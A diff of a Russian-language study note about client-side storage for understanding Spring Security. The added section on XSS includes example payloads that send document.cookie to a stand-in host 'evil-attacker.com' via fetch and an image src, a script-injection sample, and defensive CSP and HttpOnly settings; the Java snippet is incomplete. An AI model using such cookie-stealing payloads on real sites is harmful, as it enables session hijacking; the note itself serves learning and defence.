@@ -1,7 +1,7 @@
 # Хранение данных на стороне клиента (для понимания Spring Security)
 
 Чек-лист «достаточно, чтобы понять Spring Security»:
-- [ ] Зачем клиенту вообще что-то хранить
+- [x] Зачем клиенту вообще что-то хранить
 - [ ] Cookie: что это, кто и когда шлёт, атрибуты `HttpOnly`/`Secure`/`SameSite`
 - [ ] Сессия и `JSESSIONID` — дефолт Spring Security
 - [ ] localStorage / sessionStorage — чем отличаются от cookie
@@ -81,14 +81,47 @@
 >| Типичное применение | `JSESSIONID`, сессии | JWT, настройки | временные данные вкладки |
 >| Угроза | CSRF (+ XSS, если не `HttpOnly`) | XSS | XSS |
 
+>[!question]- пример XSS на фронте
+>При загрузке страницы с комментариями у жертвы может выполняться скрипт 
+>```
+>fetch('https://evil-attacker.com' + encodeURIComponent(document.cookie)); 
+>```
+>который отдает злоумышленнику секретные данные жертвы
+>Spring Security решает через запрет делать запросы на другие сайты и может стирать <script></script> при чтении из БД с помощью Spring + Thymeleaf , иил так : 
+>```
+>@Configuration
+>@EnableWebSecurity
+>public class SecurityConfig {
+>@Bean
+>public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
+>http.headers(headers -> headers.contentSecurityPolicy(csp -> csp
+>// Разрешаем скрипты только с нашего сайта, запрещаем fetch на сторонние домены
+>.policyDirectives("default-src 'self'; script-src 'self'; connect-src 'self';")
+>));
+>return http.build();
+>```
+> или через 
+> ```
+> server.servlet.session.cookie.http-only=true
+> ```
+>Через создание картинки: Скрипт динамически создает на странице невидимое изображение. Браузер пытается его загрузить и сам отправляет куки в адресе ссылки:
+>```
+>let img = new Image();
+>img.src = 'https://evil-attacker.com' + document.cookie;
+>```
+>в строку поиска хакер вводит 
+>```
+><p>Результаты по запросу: <script>alert('Уязвимость!')</script></p>
+>```
+
 >[!question]- XSS и CSRF — почему угроза зависит от способа хранения
 >Две разные атаки, и выбор хранилища решает, какая тебе грозит.
 >
->**XSS** (внедрение чужого JS на твою страницу): чужой скрипт читает всё, до чего дотянется JS.
+>**XSS** Аббревиатура **XSS** расшифровывается как ==**Cross-Site Scripting**==  ,"X" нужен чтбы не получилось CSS, (внедрение чужого JS на твою страницу): чужой скрипт читает всё, до чего дотянется JS.
 >- localStorage / sessionStorage → читаются из JS → **JWT можно украсть**.
 >- cookie с `HttpOnly` → из JS **не видна** → украсть сложнее. Плюс cookie в пользу сессий.
 >
->**CSRF** (чужой сайт втихую шлёт запрос на твой сервер от твоего имени): работает именно потому, что **браузер сам прикладывает cookie**.
+>**CSRF** - подделка запроса (cross-site-request-forgery), (чужой сайт втихую шлёт запрос на твой сервер от твоего имени): работает именно потому, что **браузер сам прикладывает cookie**.
 >- Сессия на cookie → уязвима к CSRF → поэтому Spring Security **по умолчанию включает CSRF-защиту** (токен на форму) и есть `SameSite`.
 >- JWT в `Authorization`-заголовке → браузер его сам не шлёт → CSRF почти не грозит, но зато токен открыт XSS.
 >
